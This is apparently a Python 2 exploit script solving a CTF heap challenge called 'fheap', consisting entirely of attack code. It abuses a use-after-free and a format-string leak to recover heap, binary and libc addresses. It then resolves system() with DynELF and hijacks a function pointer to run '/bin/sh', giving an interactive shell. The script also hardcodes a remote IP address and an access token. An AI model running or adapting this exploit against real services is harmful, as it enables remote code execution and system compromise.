#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-
from mkpwn import *
from time import sleep
from pwnlib.dynelf import *
from pwnlib.elf import *

# settings
local   = False
debug   = False

if local:
    target  = './fheap_e56aad293510fc5e6c5805be8c63bc7d'
else:
    target  = ('115.28.78.54', 80)

# get io
io  = mk(target, debug)

# global
heap_base = 0x0
magic = 0x0

def create(size, s, timeout=0):
    io.ru('3.quit')
    sleep(timeout)
    io.pr('create ')
    io.ru('size:')
    sleep(timeout)
    io.pr(size)
    io.ru('str:')
    sleep(timeout)
    io.w(s)

    pass

def delete(idx, payload='', timeout=0):
    io.ru('3.quit')
    sleep(timeout)
    io.pr('delete ')
    io.ru('id:')
    sleep(timeout)
    io.pr(idx)
    io.ru('sure?:')
    sleep(timeout)
    io.pr('yes' + payload)

def leak_libc_prepare(address):
    fmt = '%{}$s'.format(0x9).ljust(0x18, 'a')
    create(0x1a, fmt+ l16(magic))
    delete(15, payload=''.ljust(0x5, 'A') + l64(address))

def leak_libc(address):
    size        = 0x8
    count       = 0
    buf         = ''
    while True:
        leak_libc_prepare(address + count)
        # leak(str(address + count))
        data = io.ru('aaaaaa')[:-6]
        delete(14)
        print data.encode('hex')
        count += (len(data) + 1)
        buf += (data + '\x00')
        print count
        if count >= size:
            break
    leak_data = buf[:size]
    print '{} ==> {}'.format(hex(address), leak_data.encode('hex'))
    return leak_data

def leak(address):
    fmt = '%{}$s'.format(0x9).ljust(0x18, 'a')
    create(0x1a, fmt+ l16(magic))

    #io.gdb_hint([0x0000555555554000 + 0x1037, 0x0000555555554000 + 0xfcd])
    delete(15, payload=''.ljust(0x5, 'A') + l64(address))
    data = io.ru('aaaaaa')[:-6]
    delete(14)
    return data

def leak_heap():
    # malloc 0, 1, 2
    create(0x9, 'A' * 0x8 + '\x31\n', timeout=0.3)
    create(0x9, 'A' * 0x8 + '\x31\n', timeout=0.3)
    create(0x2, 'A\x00\n', timeout=0.3)
    delete(1, timeout=0.3)
    delete(2, timeout=0.3)
    delete(1, timeout=0.3)
    create(0x1, '\x40\n', timeout=0.3)
    create(0x1, '\x28\n', timeout=0.3)
    create(0x1, '\x00\n', timeout=0.3)
    print 'magic ' + hex(magic)
    create(0xa, 'A'*8 + l16(magic) + '\n', timeout=0.3)
    #io.gdb_hint([0x0000555555554000 + 0xe93])
    delete(1, timeout=0.3)
    global heap_base
    heap_base = l64(io.r(6) + '\x00\x00') - 0x40
    info_found("heap base", heap_base)
    return heap_base

def getshell(system):
    sh = '/bin/sh;'.ljust(0x18, 'a')
    create(0x20, sh + l64(system))
    delete(15)

# exp
def exp():
    leak_heap()

    for i in xrange(0xe):
        create(0xf, 'A' * 0x8 + '\x31')

    # prepare
    create(0x8, 'A' * 8 + '\x31')
    create(0x8, 'A' * 8 + '\x31')
    delete(15)
    delete(14)

    elf_base = l64(leak_libc(heap_base+0x28)[:8]) - 0xd52
    info_found('elf base', elf_base)

    offset_elf_puts = 0x202050
    ptr_libc = l64(leak_libc(elf_base + offset_elf_puts)[:8])
    elf = ELF('./fheap_e56aad293510fc5e6c5805be8c63bc7d')
    d = DynELF(leak_libc, ptr_libc, elf = None)
    getshell(d.lookup('system'))

    info_shell()
    io.interact()

# main
if __name__ == '__main__':
    while True:
        global magic
        magic = 0xd9d0
        #magic = 0x49d0
        try:
            io = mk(target, debug)
            io.ru('token:')
            io.pr('35e51df1d01627ec602f1b2d9bc666f5LKJ6F4Ug')
            exp()
        except:
            print 'hello'
            sleep(10)
